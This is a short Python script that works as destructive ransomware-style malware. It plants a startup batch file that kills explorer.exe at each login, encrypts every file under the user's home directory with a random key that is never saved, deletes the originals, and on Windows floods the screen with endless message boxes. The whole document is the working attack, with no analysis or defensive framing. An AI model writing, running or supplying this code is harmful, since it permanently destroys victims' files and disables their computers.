import os
import sys
from cryptography.fernet import Fernet

code = 'taskkill /f /im explorer.exe'

startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
file_path = os.path.join(startup_folder, 'start.bat')

with open(file_path, 'w') as file:
    file.write(code)

# Generar clave
key = Fernet.generate_key()

def encrypt_file(file_path, key):
    if file_path.endswith(".zlo"):
        return

    try:
        f = Fernet(key)
        with open(file_path, "rb") as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        encrypted_file_path = file_path + ".zlo"
        with open(encrypted_file_path, "wb") as file:
            file.write(encrypted_data)
        print(f'{file_path} encrypted successfully!')
        os.remove(file_path)

    except Exception as e:
        print(f'Error encrypting {file_path}: {e}')
        pass

User_PC = os.path.expanduser('~')

for root, dirs, files in os.walk(User_PC):
    for file in files:
        file_path = os.path.join(root, file)
        if os.path.isfile(file_path):
            try:
                encrypt_file(file_path, key)
            except Exception as e:
                print(f'Error processing {file_path}: {e}')
                pass

Desc = 'desc'
osystem = sys.platform

if osystem == 'nt' or osystem == 'cygwin' or osystem == 'win32':
    while True:
        os.system(f'msg * {Desc}')
